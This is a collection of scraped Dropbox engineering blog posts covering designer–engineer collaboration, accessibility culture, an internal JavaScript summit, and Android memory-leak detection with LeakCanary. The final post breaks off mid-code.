{"website": "Dropbox", "title": "On working with designers", "author": ["Justin Hileman"], "link": "https://dropbox.tech/frontend/on-working-with-designers", "abstract": "Develop an appreciation for good design Help designers develop an appreciation for engineering In the end, understanding design makes you a better engineer Paper onboarding mocks Editor’s note: On January, 18, 2019 the Dropbox Design blog featured a post from Product Designer, Jenny Wen, on working with engineers . This post covers the topic from an engineer’s perspective. One of my favorite things as an engineer building Paper is how closely I get to work with designers. It’s an important partnership. When we share the same goals, work closely together, and understand what is important to each other we can create things that we would never be able to accomplish on our own. The opposite is also true. When we don't align early, when we work at a distance, or when we don’t consider what they find important we thrash, we lose momentum, and we build a worse product. Through years of working closely with designers—some of whom helped with this post!—I’ve seen a lot of patterns that work. Here are some principles and practical advice for better understanding and working alongside designers, and how to avoid some of the failure modes I’ve seen along the way. This stuff matters. We will build better products, faster, if we have a tight iteration loop with design. We can avoid a waterfall-style “product → design → engineering” delivery of requirements and specs. We will identify concerns faster, validate ideas earlier, and have an easier time making course corrections when we run into issues. Develop an appreciation for good design Learn what designers value. Ask about mocks, or even early sketches. Learn why the designer proposed what they did. Ask “what details of this design are precious?” Understand the desired user experience. Ask “what things do you really like about this design?” Ask “how final is this design?” Designers and their tools are great at making things look polished and finished. But sometimes things look set-in-stone before they actually are. So ask! Ask what’s still exploratory. Ask what’s going to change. Ask which bits are finalized and ready to implement. Learn how to tell when your implementation matches the design. If the designer tells you something doesn’t look or act right, make sure you understand why. Ask questions about their feedback, rather than just implementing it. With practice, you’ll learn to anticipate the feedback they’ll give you, which saves time and effort for both of you. If something doesn’t seem right, say something. Even if you’re not a designer, you’re a user. And—importantly—you’re closer to the implementation than the designer, so you might have a better idea of how something should work. Use your intuition. You’re allowed to be opinionated about your product! Understand and appreciate design systems. In my opinion, this is one aspect of design that engineers are often better equipped for than designers. When implementing a design, look for the patterns. Figure out the system. Understand how it fits into the larger picture. Colors are a great example of this. When designers use visual tools to mock something up, it’s not hard to pick the wrong shade of grey or variant of a color in the design. When you understand the system, you can look at the current design as part of a larger whole and figure out where things don’t quite line up. You can help designs to be consistent. Sweat the [right] details. Once you understand which elements are important about a particular design, nail those ones. Make ‘em perfect. Sit with designers; work with designers This is the fastest way to appreciate their work , and to learn what they care about. One of my favorite ways to polish an implementation is to get it to 90% , and then finish it off with the designer, at my computer, in real time. Some things won’t translate exactly right from mocks or prototypes to actual usage; if the designer is sitting right there, they can course correct without the overhead of multiple iterations and mockups and reviews. Switch up the order you build things to account for design iteration. Handle the UX, the data, the flow, the functionality, the general layout first. When iterating on unlaunched features, take shortcuts . It’s okay to make ugly things. Then work on successively more polished and precise implementations of the designs. Ideally, once the UX / data / flows / functionality bits are finished, ship those behind a feature flag, enabled only for yourself and the designer. It’s amazing how much can change once you’ve lived with the feature for a bit. Help designers think through the details Ask a ton of questions: How does this design change for different devices or screen sizes? What does it look like on mobile? What happens when this design is internationalized ? Do the words fit just perfectly in the original design? Are things flexible enough to support German or Russian translations? Establish the extremes, as these are often the cases that don’t get attention in mockups. What is the empty state? What if the user has a ridiculous amount of data or activity? What breaks? What copy, or illustrations, or delightful experiences do we need to plan for these extremes? Help fill in the gaps. If a margin doesn’t quite work, or some colors aren’t exactly the ones in your app palette, or the design isn’t responsive for really large or really small screens, use your best judgement to fill in the gaps. Once you’ve got the thing built, it’ll be a lot easier to see why you needed to make that call, and whether you made the right call. Work the details out when you’re sitting with the designer for the last 10% 🙂. Bring your own cupcake “Little big details” are tiny designed experiences that bring more than their fair share of delight. Paper has plenty; some you might have noticed, some are still waiting to surprise you. If someone tweets something they love about Paper, there’s a good chance they’re tweeting about a little big detail. At Dropbox, we call these experiences “cupcake”; it’s one of our five core values. Literally, it's just a picture of a happy cupcake. Paper has a lot of these moments. Changing the favicon of your browser tab to an emoji from the doc title. Markdown editing shortcuts. Attribution. Converting “->” into “→” and “<3” into ❤. Many of our empty doc writing prompts. More typography details than you would even imagine—ask me about “hanging punctuation” when you have a minute… or twenty. The “emoji count” feature. /shrug . Doc previews. The keyboard shortcut help panel. The message we show when you try to “save” a Paper doc (Haven’t seen this one? Watch the “updated just now” timestamp at the bottom of the page and press Cmd+S . Wait for it to change back to the timestamp, then hit it again. And again. And again 🙂) Each of the details in that list came from engineers. Find delightful details to add to whatever you’re making! Help designers develop an appreciation for engineering Explain engineering constraints. They’re not always obvious to non-engineers . Get involved early in the process. Ask to see early concepts and rough sketches. Look over proposed designs for red flags. Help the designers understand fundamental issues with designs before they’ve spent a ton of time polishing them and getting them pixel perfect. The best time to raise concerns about functionality is before the design has gone through reviews and the designer has invested in getting buy-in from other designers. They won't always be flexible on details. The “easier” approach isn’t always the right answer. Some designs are worth spending the extra effort on. There’s a healthy tension here. Odds are, for any given project, there are elements the designer thinks of as important, but which should really be scoped down. Ultimately, designers should know which parts we’re spending extra effort on, so they can weigh the importance of those pieces against all the other implementation work. Do your own design review In hardware, there’s a concept called “design for manufacturability.” For any given widget, there are lots of ways to build it. A naive approach is to take the industrial designer’s CAD files and build them exactly to spec. But this is rarely the most cost effective, fastest, or best way to build things. Instead, manufacturers will propose a set of changes, with the intent of reducing materials needed, reducing tool time, improving durability, or optimizing for available supply of components. Sometimes changing the rounding of a corner slightly, or switching to a different material, or removing an undercut, or moving some screws around will make a significant difference in the “manufacturability” of a widget. A similar concept can apply to product design and software engineering. Do an informal “design for manufacturability” pass on designs you’re given: look for the parts that will be hardest to implement, or that you have performance concerns about in production, or will otherwise be suboptimal. Suggest alternatives. Frame things in terms of time to implement, or maintainability, or a better user experience: “If we can remove this small detail, it’ll take two days less time to build” or “If we reuse an existing UI component that’s similar but not exactly like what you’ve designed, it’ll save a week of dev time, and we’ll have fewer bugs because the existing component has been in production use for a while.” Negotiate the details Not all designs are set in stone. Kurt Varner, Paper’s design lead, argues that “ no design is set in stone—especially if engineering hasn’t yet seen it.” Often there are a handful of things that are absolutely necessary, and a lot of things that are in the design because they’ll work. Many other things might also do the job, so if some detail will be a lot of work and you wonder if it’s worth the extra complexity, ask! Do a little horse trading. “I can fit in this one important and difficult thing, but we have to find somewhere to cut effort elsewhere.” Designers are usually willing to make concessions to get the parts they really care about built. Knowing what the designer values in a given design will help you make these calls, and will ensure that both you and the designer are optimizing for the same things. Involve your product managers. When weighing engineering complexity and considering tradeoffs, be sure to bring your PMs into the conversation. It’s their job to help navigate these compromises, so it’s important for them to deeply understand both the design needs and the engineering risks. They’ll help negotiate and evaluate the options, and will ensure that we’re having the appropriate discussions. Push back against custom styles. Does a button look a little off compared to the default component style? Ask whether it needs to be different. It’s fine to do one-off customizations sometimes, but it should always be a deliberate choice. If it is an important change , ask whether this change should be applied to all other instances as well. P ropose alternatives whenever you want to say “no.” This is where understanding the intent of design comes in handy. Rather than saying “No, we can’t do that,” say “will this work instead?” In the end, understanding design makes you a better engineer Gaining an appreciation for design helps you build products that users love. Which. Is. Huge. When you get a chance to work with great designers, don’t just work with them, take the opportunity to learn from them. We’re hiring! The Paper team is hiring talented Product engineers . We are building Dropbox Paper as an inspiring, delightful collaborative tool that can help bring teams together. Users can stitch together photos, videos, tables, code, etc. in real time, moving seamlessly from brainstorming and feedback, to creating and tracking tasks, to final presentations. You'll be part of a fast moving cross-functional team working to improve collaboration for all Dropbox users. We're also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Front End Paper Culture Frontend UI // Copy link Link copied Link copied", "date": "2019-03-06"},
{"website": "Dropbox", "title": "Creating a culture of accessibility", "author": ["Cordelia Mcgee Tubb"], "link": "https://dropbox.tech/frontend/creating-a-culture-of-accessibility", "abstract": "Generate excitement Spread knowledge Keep learning Wrapping up Hack Week conference room lined with colorful balloons on left and right side, creating a rainbow effect. At the far end of the conference room, “Accessibility hack space” is written in big bold letters on a whiteboard. At Dropbox, we strive to make products that are easy for everyone to use. As part of that mission, we’ve been improving product accessibility for users with disabilities, and building a collaborative culture in which our engineers understand and value accessibility best practices as part of their process. To create accessible products, you need to find opportunities to spread accessibility knowledge and enthusiasm in a sustainable way throughout your company. But awareness is one of the largest barriers to implementing these best practices into a product. Most computer science curriculums at colleges and universities don’t include in-depth coverage of accessibility (though organizations like Teach Access are working on changing that!). As a result, technology creators don’t always know much about accessibility unless it’s already had a direct impact on their life. There’s a lot of great information out there about how to make accessible products. The W3C’s Web Content Accessibility Guidelines (WCAG 2.0) and the BBC’s Mobile Accessibility Guidelines are both examples of great resources for understanding usability considerations, and how to implement them effectively. I’d like to share some techniques we’ve used within our engineering organization (and beyond), to keep accessibility top-of-mind for product creators. At Dropbox, we strive to make products that are easy for everyone to use. As part of that mission, we’ve been improving product accessibility for users with disabilities, and building a collaborative culture in which our engineers understand and value accessibility best practices as part of their process. To create accessible products, you need to find opportunities to spread accessibility knowledge and enthusiasm in a sustainable way throughout your company. But awareness is one of the largest barriers to implementing these best practices into a product. Most computer science curriculums at colleges and universities don’t include in-depth coverage of accessibility (though organizations like Teach Access are working on changing that!). As a result, technology creators don’t always know much about accessibility unless it’s already had a direct impact on their life. There’s a lot of great information out there about how to make accessible products. The W3C’s Web Content Accessibility Guidelines (WCAG 2.0) and the BBC’s Mobile Accessibility Guidelines are both examples of great resources for understanding usability considerations, and how to implement them effectively. I’d like to share some techniques we’ve used within our engineering organization (and beyond), to keep accessibility top-of-mind for product creators. Building a robust accessibility program at Dropbox is an ongoing process, but I’m excited about how far these initiatives have spread over the years. I hope these tips can help you prioritize accessibility in your organization, too! Generate excitement How can you get your organization more engaged in accessibility? Here are some ways that have worked for us: Form a cross-functional working group or task force When we first started ramping up our accessibility efforts, we formed an accessibility working group comprised of representatives from various teams across Dropbox, including engineering, design, research, communications, and legal. Among its various projects, our working group helped create an opening for Dropbox’s first dedicated accessibility role. We also spread accessibility knowledge through field trips and an external speaker series. Cross-functional working groups like this are a great way to build up internal accessibility momentum, as they can organize events, start company-wide initiatives, and get conversations happening across disciplines. Illustrated poster mimicking the Uncle Sam “I want you” poster. The author, wearing a hat that reads “a11y” across the front, points at the viewer, above all-caps text: “I want *you* for Accessibility Champions Group.” Run an Assistive Technology Lab Assistive technology, also referred to as access technology (AT), is anything that helps a person with an impairment complete a task more quickly, easily, or independently. In the digital space, assistive technology such as screen readers, speech recognition software, screen magnifiers, and switches help users navigate and interact with UIs. As you might imagine, the user experience of a product can change a lot depending on what type of assistive technology you’re using with it. We wanted to expose our product teams to the wide variety of ways that our users might navigate our products. In 2016, our Accessibility Working Group started running Assistive Technology Labs to give teams hands-on (or, in the case of speech recognition software and head mice, hands-off!) experience exploring their own features with these tools. Our pop-up labs have several stations, each with a particular type of assistive technology. At each station, we present Dropboxers with three tasks: an easy task to familiarize them with the basic mechanics of the station’s AT; a slightly more involved task; and an extremely challenging (if not impossible) task meant to highlight areas where our user experience could be improved. We want Dropboxers to get frustrated by the last task, so they can better understand our users’ pain points and channel that frustration into fixes. Many of the tasks from our first Assistive Technology Lab are no longer challenging, thanks to continuous UI improvements from our design and engineering teams. Dropbox employees participating in our Assistive Technology Lab. Here, several people sit around a table with a variety of computers and instruction papers. One is using a head mouse, another a switch control with two buttons. At another Assistive Technology Lab, someone wears headphones and special goggles that obscure their vision while they navigate dropbox.com with a screen reader. If you’re interested in running your own Assistive Technology Lab, here are a few tips: Remember that the goal of these labs is to learn about various technology that people use with your product, not to simulate the personal experiences of individuals whose abilities may be different from your own. If a participant has a frustrating time using an AT, it can be hard to tell if that’s due to their unfamiliarity with the AT or because the experience is broken and difficult for even that AT’s most adept users. Make sure the folks running the labs have enough context to help guide participants when they get stuck, and remind participants that a more thorough understanding of these tools comes with practice and discussion with people who use them on a regular basis. Consider avoiding speech recognition software in the lab setting. I had to train the dictation software on my own voice while setting up our first lab, and soon found that it had trouble recognizing instructions from colleagues whose voices were rather different from my own, especially in a room with several people talking. Screen readers, switch controls, head mice, various color modes, and zoom tools work much better in a lab. Set these up with multiple operating systems and devices. Reward your organization’s accessibility champions We expect everyone on Dropbox’s engineering, product, and design teams to include accessibility in their process, but we like to recognize folks who put in extra effort to improve our internal accessibility processes or make our product experience more inclusive. One way we do this is through our badge system. Anyone can nominate a colleague (or themselves) for an “Accessibility Advocate” badge which, when awarded, appears on their profile in our employee directory: A screenshot of a profile’s badge section. Each badge is represented by an emoji: ​👌🏾​, ​🍨​, ​✏️​, ​📛​, ​🏆​ . The ​👌🏿​ emoji’s tooltip reads “Accessibility Advocate.” Spread knowledge When I joined Dropbox as its first full-time accessibility engineer, I wrote a ton of documentation, thinking it’d be a great way to get everyone around me to become accessibility experts. But I quickly realized that reading long documents wasn’t the most engaging way to start learning accessibility best practices, especially when those documents lived outside of engineers’ normal workflows. Now, in addition to this documentation, we’ve been spreading accessibility knowledge in more dynamic ways: Incorporate accessibility feedback into the development process To give accessibility advice relevant to colleagues’ current context, we built an accessibility debug tool and added it to the footer of our website, visible only to Dropboxers. The debug tool runs a series of accessibility checks on the current page. Screenshot of the accessibility tool when it’s first expanded, showing 5 errors. The UI includes a button to “Run accessibility checks again” and two tabs for “Results” and “Settings.” The Results tab is selected and includes a filter for filtering results by type (Failure, Warning, Passing), as well as a list of results. Only the first result is visible in this UI, a single failure for “dropbox_anchorMissingHref.” Accessibility tool shows two error messages for image-alt and td-has-header, with descriptions of each error, recommended solutions, and a link to more information. Accessibility tool shows shows a list of passing rules, including dropbox_missingH1, dropbox_unclearLinkText, lowContrastElements, and aria-allowed-attr. Screenshot of the accessibility tool when it’s first expanded, showing 5 errors. The UI includes a button to “Run accessibility checks again” and two tabs for “Results” and “Settings.” The Results tab is selected and includes a filter for filtering results by type (Failure, Warning, Passing), as well as a list of results. Only the first result is visible in this UI, a single failure for “dropbox_anchorMissingHref.” For this tool’s first iteration, we included a small set of custom accessibility checks, looking for buttons and links without accessible names, keyboard-inaccessible links, unlabelled input fields, images without alternative text, and low contrast text. Since then, we’ve expanded the tool to include 51 accessibility checks, most of which come from Deque’s open-source aXe framework . What’s great about this tool is that it provides practical, relevant accessibility feedback without being too overwhelming or intrusive. As front-end developers work on new UIs, they can consult the tool to see if they are introducing any new errors on the page, get tips on how to fix them, and find contact information for the Accessibility Team if they still have questions. Automated accessibility checks like this can be incorporated into several stages of the engineering process, from on-page tools to code linters and unit tests. Do accessibility bug bashes Does your team ever get into a room together to test out user flows and try to break the product? At Dropbox we call these “bug bashes,” meetings during intermediate stages in UI development when engineers, quality engineers, designers, and product managers gather together to manually test a feature in a variety of scenarios and find as many bugs as we can. Bug bashes are the perfect opportunity to check for accessibility issues in in-progress features. During a team bug bash, get a few people in the room to try each core flow with just their keyboard, or with a free screen reader or their computer’s built-in zoom controls. Can they perform all expected tasks? Do they ever get stuck or lost? While you can schedule accessibility-specific bug bashes for thorough exploration of a product’s accessibility issues, it’s important to weave accessibility bug exploration into the regular bug bash meetings. This reinforces that accessibility is integral to usability, not a separate issue to address. Make an entire feature accessible All of a company’s products should be as accessible as possible. If that isn’t the case with your current suite of products, it can sometimes be hard to figure out where to start. One of the best ways to get going is to just pick one feature and commit to making it accessible. The best candidates for this project are brand new features you can build from the beginning with accessibility in mind, or a pre-existing, high-traffic area of your product. The team working on this feature will learn by doing, developing accessibility knowledge that will carry over to their next projects and set an example for other product teams. Accessibility improvements to a single feature can also help make other features more accessible with minimum effort. For example, during a recent refresh of our file browsing web UI, we paid special attention to the screen reader and keyboard experience. This led us to build a number of new React components that had accessibility baked into them, including dropdown menus and tree views. Because we architect our React components to be reusable, these accessibility enhancements have since trickled into other areas of our web UI. Here’s an animation of our reusable tree component in action: Tree view depicting a sample folder hierarchy in Dropbox, along with some of its corresponding HTML. By pressing arrow keys, user can navigate up and down through the tree, as well as expand and collapse folder nodes. In the HTML, the tree's aria-activedescendant attribute automatically updates to the id of the currently selected tree item. Individual tree items' aria-expanded and aria-selected attributes update to reflect their current state. Host internal talks and invite guest speakers Tech talks are a great way to share accessibility knowledge throughout your team. Try to do one once a quarter to keep the information fresh, especially if you’re consistently hiring more UI engineers and designers. Looking for ideas? We’ve recently covered these topics in our internal talks: Accessibility improvements to Feature X, and what we learned along the way Automated test frameworks for accessibility Tips for writing with accessibility in mind Tips for manually testing for accessibility Screenreader 101 If you’re interested in seeing a blog post from us on one of these topics, let us know in the comments. Bring in guest speakers to talk about inclusive design concepts! Invite accessibility experts from other companies to talk about their processes and frameworks. Invite speakers with disabilities, who can speak from personal experience to the importance of accessible technology. External speakers tend to draw a good crowd and definitely bring new and engaging perspectives. Record these talks so colleagues can reference video archives later. Keep learning Conduct user research Accessibility is about users . While you can follow all the accessibility guidelines out there and make UIs that pass every automated accessibility check, they may not actually be very efficient or enjoyable for your users. It’s important to listen to your users and turn their feedback into product improvements. Usability tests with screen reader users helped us find areas where we could improve the keyboard flow of dropbox.com . In another focus group, Dropbox users with low vision shared stories illustrating the impact color contrast has on how efficiently they can manage their files. With this user insight, we’re able to craft richer, higher quality experiences for all users. **If your organization is already doing research studies for new products, include people with disabilities as participants. It can also be helpful to lead focus groups to better understand a particular user group’s needs. Make sure to compensate research participants for their time. Invite product engineers to these sessions, or share video recordings with them, so they can understand the impact their code has — for better or worse! — on real users. Get involved in the community The digital accessibility community is a tremendous group of folks who are all driven to make technology better for people with disabilities. Staying connected to this community is a great way to keep up on current best practices, exchange advice on tricky accessibility design and development problems, and share ideas about how to advance technology further. I’ve found that this community is super generous about sharing what we’ve learned, as we all really want to provide users with quality, consistent patterns for navigation and communication. One way to get involved is through attending meet-ups and conferences. Most major cities have an accessibility interest group you can join. In San Francisco, for instance, Dropboxers attend Bay Area Accessibility Camp and some Bay Area Accessibility & Inclusive Design meetups. There are also major accessibility conferences around the country and the world, including the recent CSUN Assistive Technology Conference . These events are a great way to learn from industry leaders in accessibility. You can also get involved online by joining the Web Accessibility Slack community or following the #a11y hashtag on Twitter. Wrapping up We’ve found some of the best ways to get people engaged in accessibility are by hosting events that highlight usability impact, providing lightweight tools that point out easy-to-fix bugs, and celebrating the work of successful projects. There are still many more ways to weave accessibility into your team’s process. Try out some of these techniques for Global Accessibility Awareness Day (Thursday, May 18th) and see what sticks! Stay tuned to our blog for more accessibility tips from our team. And if you want to help make Dropbox more accessible for our 500 million users, we’re hiring . // Tags Front End Frontend Accessibility Culture // Copy link Link copied Link copied", "date": "2017-04-27"},
{"website": "Dropbox", "title": "What we learned at our first JS Guild Summit", "author": ["Annie Kramer"], "link": "https://dropbox.tech/frontend/what-we-learned-at-our-first-js-guild-summit", "abstract": "What is the JS Guild? Why hold an internal conference on frontend development? Free flow of ideas Made in San Francisco Made in Tel Aviv Made in Seattle Made in New York From ideas to action At Dropbox, we work to keep teams flowing—so earlier this month, we convened a group of our frontend engineers to do just that. At the beginning of October, we held the first JS (JavaScript) Guild Summit at our San Francisco headquarters to bring together frontend engineers from our four engineering offices for two days of teaching, learning, and collaboration. What is the JS Guild? The JS Guild is a grassroots initiative at Dropbox to improve our frontend engineering by fostering community, culture, and code quality. The group strives to teach frontend best practices to generalists and to help strong frontend engineers leverage and grow their domain knowledge. Over the past year, JS Guild members have championed several foundational improvements, including a large-scale migration of frontend code from Underscore to Lodash and early work for a migration from Flux to Redux. The JS Guild also circulates a biweekly newsletter, which is written by a rotating group of engineers and showcases frontend best practices, recently shipped projects, and news from the frontend world outside of Dropbox. Why hold an internal conference on frontend development? At the beginning of the summer, the JS Guild identified a unique challenge and opportunity: how to leverage the technical contributions from our engineers in San Francisco, Seattle, New York, and Tel Aviv so that all Dropbox engineers could benefit from the breadth of frontend code shipped in each of our offices. The JS Guild Summit represented a dedicated effort to break down silos between teams and to facilitate the free flow of ideas between engineers. In the planning of the Summit, Matthew Gerstman, one of the lead JS Guild Summit organizers, thought about “breaking down silos” as “establishing many-to-many connections across engineers so that people can collaborate and communicate as powerfully and efficiently as possible.” Free flow of ideas At the beginning of October, 115 Dropbox frontend engineers participated in two days of talks, workshops, open-ended discussions, and social events—all intended to promote knowledge transfer, to celebrate the diversity of frontend work taking place in our four engineering offices, and to identify opportunities for increased collaboration. At the JS Guild Summit, frontend engineers shared knowledge and broke down silos by giving talks on topics like: What’s good about React anyway? Everything you need to know about the JS event loop How to build accessible and inclusive web components Everything you need to know about unicode and emojis (a favorite in Dropbox Paper ) We aimed to make the Summit inclusive, so we accepted talk proposals from engineers with a wide range of technical and public speaking experience. While we held a well-attended talk by VP Design Nicholas Jitkoff, several of our presenters had the opportunity at the Summit to deliver their first-ever technical talks and to gather feedback from a large group of engineers tackling similar technical challenges. At the Summit, we also had an opportunity to identify areas for technical and foundational improvement by holding an “ unconference ,” a series of participant-driven discussions on topics seeded by conference attendees. Over 50 engineers contributed to lively and productive discussions on topics like: The future of automated UI testing at Dropbox How to increase the Dropbox footprint in the open-source world The Dropbox Chooser component Web accessibility and inclusive design principles How Dropbox engineers can use and contribute to our internal UI component library Made in San Francisco In the spirit of sharing insights from our four engineering offices, David Goldstein, a software engineer on the Web Platform team in San Francisco, set out to demystify hot reloading (a utility that’s essential to many frontend workflows) and how his team tailored our implementation to Dropbox code by making it compatible with RequireJS. Imagine you’re rapidly iterating on a web component and making independent changes in rapid succession. How do you maintain your focus and flow while rapidly modifying the contents of local TypeScript and CSS files? That’s where hot reloading comes in. Hot reloading is a mechanism that allows the browser to incorporate code changes into a page without a full page reload. It supercharges frontend workflows because: Page reloads can be slow and unnecessarily break a developer’s focus and flow. Pages have state based on what you’ve navigated to within them. That state is lost on a full page reload, so loading new code without a refresh allows us to preserve the existing state and to isolate the effects of new code changes (enabling easier debugging). Given our ongoing migration from Flux to Redux, David emphasized that the feasibility of hot reloading is tightly coupled with frontend architecture itself and gave an overview of which pieces of code are hot reloadable in a React/Redux app. With his talk, David aimed to share what happens under the hood of a hot reloading tool and thus to help other engineers better understand the critical pieces of their everyday workflows. Made in Tel Aviv Assaf Kamil, a software engineer from the Tel Aviv office who works on tools and interfaces for Dropbox Business admins, hosted a workshop on Rondo, a framework centered around tightly integrating reusable business behaviors and business flow with Redux. At its core, Rondo provides an interface for encapsulating the actions, state management, and side effects required to support a business flow. In his workshop, Assaf demonstrated how Rondo has accelerated his team’s efforts to build interfaces that help our business customers keep their flow and provided practical training to help other engineers bring Rondo to their teams and offices. Made in Seattle Many timezones away from Tel Aviv in the Seattle office, Staff Software Engineer Josh Zana was an early contributor to our ongoing Redux migration. The migration from Flux to Redux originated last year in a Web Enhancement Proposal (WEP), an internal process that we use to propose foundational changes and to align on a universal approach to implementing such changes. The authors behind the Redux WEP envisioned that migrating from Flux to Redux would provide an opportunity to build a standard “repository” for UI data shared across multiple components, to reduce technical debt, and to improve test coverage. At a high level, migrating a store from Flux to Redux involves removing state that doesn’t belong in a given store and adding the Redux constructs of actions, selectors, and reducers. This might include porting derived state to Redux selectors (optionally memoized), migrating canonical state to reducers, or converting asynchronous Flux actions to Redux Thunks or Sagas. In his talk at the Summit, Josh aimed to educate other engineers about how they can safely migrate their teams’s legacy Flux stores to Redux. Over the last few months, Josh and his team have migrated about 80% of their legacy Flux logic to Redux and, along the way, distilled a set of important learnings about undertaking such a migration: Plan in advance and ensure that you have a thorough understanding of the legacy store before starting migration work Break down migration work into manageable tasks Parallelize work across team members for load balancing and knowledge sharing Test every reducer in isolation since they should all be side effect-free Experiment with Redux Thunks and Sagas and select which of the two is sufficient and/or simpler for your use case Made in New York At the Summit, we focused both on frontend technologies (hot reloading, Redux, Rondo, and more) and on product development methodologies. Representing the New York office, software engineer and tech lead Mike Lyons gave a talk on how rapid prototyping and iteration fueled his team’s efforts to ship Dropbox Showcase , a visually compelling sharing tool for professionals and enterprise customers. While his team had to make tradeoffs to get a product to market faster, the rapid prototyping approach reduced the cost and frequency of missteps and anchored their iteration to real-world use and feedback—putting the customer at the center of their work. From ideas to action Since the JS Guild Summit, numerous frontend engineers have remarked that the opportunity to meet in person with engineers from our other offices allowed them to “understand the human behind the [Slack] avatar” and collaborate more effectively. One attendee recently noted that “my biggest takeaways during the Summit came through hearing other [engineers] present problems that are similar to the ones my team faces. It… gave a lot of insight into how my team can implement our own solutions.” At the JS Guild Summit, we shared knowledge, broke down silos between engineers, teams, and offices, and invested in our frontend engineering community. Want to collaborate with Dropbox’s growing community of frontend engineers? We’re hiring for roles in our four engineering offices. Join us! // Tags Front End Frontend Culture // Copy link Link copied Link copied", "date": "2018-10-31"},
{"website": "Dropbox", "title": "Detecting memory leaks in Android applications", "author": ["Lily Chen"], "link": "https://dropbox.tech/mobile/detecting-memory-leaks-in-android-applications", "abstract": "Common examples Detecting memory leaks Fixing memory leaks Test often, fix early Memory leaks occur when an application allocates memory for an object, but then fails to release the memory when the object is no longer being used. Over time, leaked memory accumulates and results in poor app performance and even crashes. Leaks can happen in any program and on any platform, but they’re especially prevalent in Android apps due to complications with activity lifecycles . Recent Android patterns such as ViewModel and LifecycleObserver can help avoid memory leaks, but if you’re following older patterns or don’t know what to look out for, it’s easy to let mistakes slip through. Common examples Reference to a long-lived service A fragment references an activity which references a long-lived service. In this case, we have a standard setup with an activity that holds a reference to some long-living service, then a fragment and its view that hold references to the activity. For example, say that the activity somehow creates a reference to its child fragment. Then, for as long as the activity sticks around, the fragment will continue living too. This causes a leak for the duration between the fragment’s onDestroy and the activity’s onDestroy . The fragment will never be used again, yet it persists in memory. Long-lived service which references a fragment’s view What if, in the other direction, the service obtained a reference to the fragment’s view? First, the view would now stay alive for the entire duration of the service. Furthermore, because the view holds a reference to its parent activity, the activity now leaks as well. As long as the Service lives, the FragmentView and Activity will squander memory. Detecting memory leaks Now that we know how memory leaks happen, let’s discuss what we can do to detect them. An obvious first step is to check if your app ever crashes due to OutOfMemoryError . Unless there’s a single screen that eats more memory than your phone has available, you have a memory leak somewhere. This approach only tells you the existence of the problem—not the root cause. The memory leak could have happened anywhere, and the crash that’s logged doesn’t point to the leak, only to the screen that finally tipped memory usage over the limit. You could inspect all the breadcrumbs to see if there’s some similarity, but chances are the culprit won’t be easy to discern. Let’s explore other options. LeakCanary One of the best tools out there is LeakCanary , a memory leak detection library for Android. We simply add a dependency on our build.gradle file . The next time we install and run our app, LeakCanary will be running alongside it. As we navigate through our app, LeakCanary will pause occasionally to dump the memory and provide leak traces of detected leaks. This one step is vastly better than what we had before. But the process is still manual, and each developer will only have a local copy of the memory leaks they’ve personally encountered. We can do better! LeakCanary and Bugsnag LeakCanary provides a very handy code recipe for uploading found leaks to Bugsnag . We’re then able to track memory leaks just as we do any other warning or crash in the app. We can even take this one step further and use Bugsnag’s integrations to hook it up to project management software such as Jira for even more visibility and accountability. Bugsnag connected to Jira LeakCanary and integration tests Another way to improve automation is to hook up LeakCanary to CI tests. Again, we are given a code recipe to start with. From the official documentation: LeakCanary provides an artifact dedicated to detecting leaks in UI tests which provides a run listener that waits for the end of a test, and if the test succeeds then it looks for retained objects, trigger a heap dump if needed and perform an analysis. Be aware that LeakCanary will slow down testing, as it dumps the heap after each test to which it listens. In our case, because of our selective testing and sharding set up , the extra time added is negligible. Our end result is that memory leaks are surfaced just as any other build or test failure on CI, with the leak trace at the time of the leak recorded. Running LeakCanary on CI has helped us learn better coding patterns, especially when it comes to new libraries, before any code hits production. For example, it caught this leak when we were working with MvRx mocks: Copy <failure>Test failed because application memory leaks were detected: ==================================== HEAP ANALYSIS RESULT ==================================== 4 APPLICATION LEAKS References underlined with \"~~~\" are likely causes. Learn more at https://squ.re/leaks. 198449 bytes retained by leaking objects Signature: 6bf2ba80511dcb6ab9697257143e3071fca4 ┬─── \r\n│ GC Root: System class \r\n│ ├─ com.airbnb.mvrx.mocking.MockableMavericks class \r\n│ Leaking: NO (a class is never leaking) \r\n│ ↓ static MockableMavericks.mockStateHolder \r\n│                            ~~~~~~~~~~~~~~~ \r\n├─ com.airbnb.mvrx.mocking.MockStateHolder instance \r\n│ Leaking: UNKNOWN \r\n│ ↓ MockStateHolder.delegateInfoMap \r\n│                   ~~~~~~~~~~~~~~~ \r\n├─ java.util.LinkedHashMap instance \r\n│ Leaking: UNKNOWN \r\n│ ↓ LinkedHashMap.header \r\n│                 ~~~~~~ \r\n├─ java.util.LinkedHashMap$LinkedEntry instance \r\n│ Leaking: UNKNOWN \r\n│ ↓ LinkedHashMap$LinkedEntry.prv \r\n│                             ~~~ \r\n├─ java.util.LinkedHashMap$LinkedEntry instance \r\n│ Leaking: UNKNOWN \r\n│ ↓ LinkedHashMap$LinkedEntry.key \r\n│                             ~~~ \r\n╰→ com.dropbox.product.android.dbapp.photos.ui.view.PhotosFragment instance \r\n   Leaking: YES (ObjectWatcher was watching this because com.dropbox.product.android.dbapp.photos.ui.view.PhotosFragment received Fragment#onDestroy() callback and Fragment#mFragmentManager is null) \r\n   key = 391c9051-ad2c-4282-9279-d7df13d205c3 \r\n   watchDurationMillis = 7304 \r\n   retainedDurationMillis = 2304 198427 bytes retained by leaking objects \r\n   Signature: d1c9f9707034dd15604d8f2e63ff3bf3ecb61f8 It turned out that we hadn’t properly cleaned up the mocks when writing the test. Adding a few lines of code avoids the leak: Copy @After\r\n    fun teardown() {\r\n        scenario.close()\r\n        val holder = MockableMavericks.mockStateHolder\r\n        holder.clearAllMocks()\r\n    } You may be wondering: Since this memory leak only happens in tests, is it really that important to fix? Well, that’s up to you! Like linters, leak detection can tell you when there’s code smell or bad coding patterns . It can help teach engineers to write more robust code—in this case, we learned about the existence of clearAllMocks() . The severity of a leak and whether or not it’s imperative to fix are decisions an engineer can make. For tests on which we don’t want to run leak detection, we wrote a simple annotation: Copy @Retention(RetentionPolicy.RUNTIME)\r\n@Target({ElementType.METHOD, ElementType.TYPE})\r\npublic @interface SkipLeakDetection {\r\n    /**\r\n     * The reason why the test should skip leak detection.\r\n     */\r\n    String value();\r\n} and in our class which overrides LeakCanary’s FailOnLeakRunListener() : Copy override fun skipLeakDetectionReason(description: Description): String? {\r\n    return when {\r\n        